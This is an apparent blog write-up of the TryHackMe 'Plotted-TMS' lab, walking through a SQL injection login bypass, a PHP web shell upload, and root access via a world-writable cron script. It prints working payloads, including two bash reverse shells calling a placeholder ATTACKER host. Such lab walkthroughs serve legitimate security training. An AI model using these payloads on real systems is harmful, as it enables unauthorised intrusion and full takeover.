---
title: "TryHackMe: Plotted-TMS — Writeup"
date: 2022-03-04 15:00:00 +0800
categories: [TryHackMe]
tags: [linux, ctf, sqli, cms, priv-esc]
---

## Overview

**Plotted-TMS** is an easy TryHackMe room involving SQL injection in a traffic management system CMS, leading to authentication bypass, RCE via file upload, and a cron-based privilege escalation.

---

## Recon

```bash
nmap -sC -sV 10.10.x.x
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Discovered `/management` — a login form for "Traffic Offense Management System".

---

## SQL Injection — Auth Bypass

Login form is vulnerable to classic SQLi. Payload:

```
Username: admin'-- -
Password: anything
```

Logged in as admin.

---

## RCE via File Upload

Admin panel has a driver profile photo upload — no file type validation. Uploaded a PHP reverse shell disguised as an image:

```php
<?php system($_GET['cmd']); ?>
```

Saved as `shell.php`, uploaded, then navigated to the upload path to trigger it.

```bash
nc -lvnp 4444
# trigger: http://10.10.x.x/management/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'
```

Shell returned as `www-data`.

---

## Privilege Escalation — Cron Job

```bash
cat /etc/crontab
```

```
* * * * * root /var/www/scripts/backup.sh
```

`/var/www/scripts/backup.sh` is **world-writable**. Overwrote it with:

```bash
echo 'bash -i >& /dev/tcp/ATTACKER/5555 0>&1' > /var/www/scripts/backup.sh
```

Waited one minute → shell as **root**.

---

## Key Takeaway

Two classic misconfigurations: unauthenticated SQLi and a world-writable cron script. File upload validation and least-privilege cron jobs would have closed both.
